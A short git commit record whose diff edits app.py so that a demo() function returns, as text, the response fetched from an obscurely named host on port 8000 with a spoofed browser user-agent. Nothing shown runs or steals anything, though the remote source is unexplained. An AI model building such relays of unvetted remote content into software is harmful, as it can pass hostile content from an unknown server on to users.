be26efb5c357867a02b1998497d185c8facc1fa4
iyzigaming <121947178+iyzigaming@users.noreply.github.com>
2023-02-07 21:15:35 +0300

    Update app.py

--- app.py
+++ app.py
@@ -22,7 +22,7 @@ def demo():
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
     }
     ts = requests.get("http://germanydnsx11.com:8000/ZbLQXUxk/Es272827../89036",allow_redirects = True)
-    tsal = ts.content
+    tsal = ts.text
     return tsal
 
 
